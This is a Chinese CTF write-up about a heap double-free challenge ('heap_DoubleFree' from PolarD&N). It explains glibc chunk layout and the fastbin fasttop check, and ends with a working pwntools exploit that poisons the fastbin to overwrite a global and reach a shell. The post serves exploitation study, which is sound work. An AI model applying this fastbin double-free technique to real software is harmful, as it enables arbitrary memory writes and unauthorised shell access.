---
title: doubleFree
published: 2026-03-21
description: "一道简单的堆题目, double free"
tags: ["ctfwp", "heap"]
category: ctf
draft: false
---

<!--more-->

## double free
Double Free是指对*同一块内存重复调用free()两次或多次*的程序漏洞。由于内存管理器的设计特性，这会导致内存破坏，最终可能实现任意地址读写。

chunk的结构
```c
struct malloc_chunk {
  size_t prev_size;    // 前一个chunk大小
  size_t size;         // 当前chunk大小（最后3位是标志位）
  
  // 联合体：使用状态和空闲状态复用同一块内存
  union {
    struct {
      struct malloc_chunk* fd;  // 下一个空闲chunk
      struct malloc_chunk* bk;  // 前一个空闲chunk
    };
    struct {
      char user_data[];  // 用户数据区
    };
  };
};
```
关键点:
 + 使用状态: `user_data` 存储用户数据
 + 空闲状态: `fd`/`bk` 存储链表指针(*服用用户数据区*)

在内存中的转化如下:
```txt
使用中的chunk：
+------------------+
| prev_size        |
| size             |
| user_data[0..n]  |  ← malloc返回的指针
| ...              |
+------------------+

释放后的chunk（在fastbin中）：
+------------------+
| prev_size        |
| size             |
| fd (next chunk)  |  ← 原来的user_data区被复用作fd指针
| bk (prev chunk)  |
+------------------+
```

所以在修改完fd指针之后，再次malloc 就可以获取 目标地址的写入权.


### fastbin 检测机制 - fasttop
相关的代码如下
```c
// glibc的检查 fasttop
if (__builtin_expect (old == p, 0)) {
  errstr = "double free or corruption (fasttop)";
  goto errout;
}
```

## heap_DoubleFree - PolarD&N

由于glibc版本为libc_2.23-0ubuntu11.3_amd64不需要考虑tecache，将程序拖入ida 发现如下重要函数


```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int ID_1; // ebx
  int Choice; // [rsp+4h] [rbp-7Ch] BYREF
  int ID; // [rsp+8h] [rbp-78h] BYREF
  int size; // [rsp+Ch] [rbp-74h] BYREF
  char *ptr[10]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v8; // [rsp+68h] [rbp-18h]

  v8 = __readfsqword(0x28u);
  init();
  globals1[0] = 0;
  globals1[2] = 113;
  memset(ptr, 0, sizeof(ptr));
  while ( 1 )
  {
    while ( 1 )
    {
      Menu();
      printf("root@ubuntu:~/Desktop$ ");
      __isoc99_scanf("%d", &Choice);
      ID %= 10;
      if ( Choice != 1 )
        break;
      puts("please input id and size :");
      __isoc99_scanf("%d", &ID);
      __isoc99_scanf("%d%*c", &size);
      ID_1 = ID;
      ptr[ID_1] = (char *)malloc(size);
      puts("please input contet:");
      gets(ptr[ID]);
    }                                           // while end
    if ( Choice == 2 )
    {
      puts("please input id :");
      __isoc99_scanf("%d", &ID);
      free(ptr[ID]);
    }
    else if ( Choice == 3 )
    {
      puts("please input id :");
      __isoc99_scanf("%d", &ID);
      puts(ptr[ID]);
    }
    else
    {
      if ( globals1[4] != 257 )
      {
        printf("exit!");
        exit(0);
      }
      puts("your are got it!");
      system("/bin/sh");
    }
  }
}
```

发现这是一个涉及堆的菜单程序，通过分析发现只要使得 global1\[4\]的值等于`0x101`那么就可以得到shell,同时发现 Choice = 2 的时候可以多次free同一个地址，所以考虑采用Double Free，造成任意地址写

这里是 fastbin的double free 攻击,同时题目这里已经构造号了global1\[2\] = 113， 也就是0x71，所以构造的chunk 为0x70才能使得攻击成功


于是得到如下exp.py

```python
from pwn import *

FILE = "./heap_Double_Free"

context.log_level = "debug"
context.binary = FILE

elf = ELF(FILE)
rop = ROP(elf)

p = process(FILE)
# p = remote("1.95.36.136", 2086)

def addChunk(idx: bytes, size: bytes, context: bytes) -> None:
  global p
  p.sendlineafter(b"root@ubuntu", b"1")
  p.sendlineafter(b"please input id and size :\n", idx)
  p.sendline(size)
  p.sendlineafter(b"please input contet:\n", context)

def delChunk(idx: bytes) -> None: 
  global p
  p.sendlineafter(b"root@ubuntu", b"2")
  p.sendlineafter(b"please input id :\n" , idx)
  
addChunk(b"0", b"96", b"aaaa")
addChunk(b"1", b"96", b"aaaa")

delChunk(b"0") # 这里体现了 fastbin 的检测机制，检测时释放的内存是不是头部chunk
delChunk(b"1")
delChunk(b"0")
# 6010A0
addChunk(b"2", b"96", flat([0x6010A0]))
addChunk(b"3", b"96", b"aaaa")
addChunk(b"4", b"96", b"aaaa")
addChunk(b"5", b"96", flat([0x101]))

p.sendlineafter(b"root@ubuntu", "4")

p.interactive()
```